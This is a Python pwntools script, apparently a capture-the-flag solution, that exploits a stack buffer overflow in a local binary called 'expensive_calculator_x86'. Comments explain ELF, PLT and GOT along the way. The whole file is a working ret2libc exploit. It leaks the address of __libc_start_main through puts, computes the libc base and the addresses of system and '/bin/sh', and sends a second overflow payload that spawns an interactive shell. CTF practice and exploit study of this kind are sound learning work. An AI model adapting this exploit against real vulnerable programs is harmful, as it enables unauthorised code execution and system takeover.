#!/usr/bin/python3
import time
from pwn import * """ 
                  This is the pwntools library to install use
                  pip3 install pwntools
                  The library is is a CTF framework and exploit development library. 
                  Written in Python, it is designed for rapid prototyping and development, 
                  and intended to make exploit writing as simple as possible.
                    """

sh = process('./expensive_calculator_x86')

"""
    Explanation for ELF
    --------------------

    Most exploitable CTF challenges are provided in the Executable and Linkable Format (ELF). 
    Generally, it is very useful to be able to interact with these files to extract data such 
    as function addresses, ROP gadgets, and writable page addresses. In our case we have 
    expensive_calculator_x86 which is a linux executable (or more specific ELF file).

"""

expensive_ = ELF('./expensive_calculator_x86')

"""
    Explanation for PLT
    -------------------
    PLT stands for Procedure Linkage Table which is, put simply, used to call 
    external procedures/functions whose address isn't known in the time of linking, 
    and is left to be resolved by the dynamic linker at run time.
    In pwntools ELF class stores this entries with their addresses in a dictionary
    called plt. So you can access them as follows elf_object.plt['puts'] (Get plt
    entry for puts)
"""

puts_plt = expensive_.plt['puts']

"""
    Explanation for GOT
    -------------------
    GOT stands for Global Offset Table.It is a section of a computer program's 
    (executables and shared libraries) memory used to enable computer program 
    code compiled as an ELF file to run correctly, independent of the memory 
    address where the program's code or data is loaded at runtime.
    In pwntools ELF class stores these entries with their addresses in a dictionary
    called got and so we can access it like so.
"""

libc_start_main_got = expensive_.got['__libc_start_main']
main = expensive_.symbols['main']

print('puts ', hex(puts_plt))
print('libc_start_main_got ', hex(libc_start_main_got))
print('main', hex(main))

print('Leak libc_start_main_got address and return to main again.')
payload = flat(['A'*1044, puts_plt, main, libc_start_main_got])

#sleep to wait for the whole output before the prompt
time.sleep(4)
#receive the output before the prompt
sh.recv()
#send input in order to overflow the buffer and write our ROP gadget to leak libc_start_main
sh.sendline(payload)

libc_start_main_addr = u32(sh.recv()[29:33])
print('leaked address libc_start_main ', hex(libc_start_main_addr))

libc = ELF('/lib32/libc-2.31.so')
system = libc.symbols['system']
binsh = 0x18f352

libcbase = libc_start_main_addr - libc.symbols['__libc_start_main']
system_addr = libcbase + system
binsh_addr = libcbase + binsh

print('libc base ', hex(libcbase))
print('system address ', hex(system_addr))
print('binsh address ', hex(binsh_addr))

payload = flat(['A'* 1044, system_addr, 0xdeadbeef, binsh_addr])

#wait to receive the whole output before prompt
time.sleep(4)
#send payload to get a shell
sh.sendline(payload)

sh.interactive()


